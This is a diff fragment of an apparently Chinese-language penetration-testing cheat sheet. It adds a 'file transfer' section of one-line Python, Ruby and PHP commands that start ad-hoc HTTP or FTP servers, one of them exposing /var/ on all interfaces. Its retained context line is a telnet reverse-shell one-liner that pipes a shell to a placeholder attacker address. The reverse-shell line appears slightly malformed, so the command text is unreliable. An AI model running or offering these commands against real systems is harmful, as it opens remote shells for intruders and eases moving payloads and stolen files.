@@ -29,3 +29,25 @@
 **Telnet**
 
 	 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+	 
+##文件传输
+
+**Python**
+
+    python2 -m SimpleHTTPServer 8000
+
+    python3 -m http.server 8000
+    
+    python -m pyftpdlib -p 2121
+    
+**Ruby**
+
+     ruby -run -ehttpd . -p8000  #ruby -run -ehttpd 路径 -p端口
+
+**PHP**
+
+    php -S 0.0.0.0:8000 -t /var/   #用法： php -S IP:端口  -t 服务器根路径
+
+
+
+
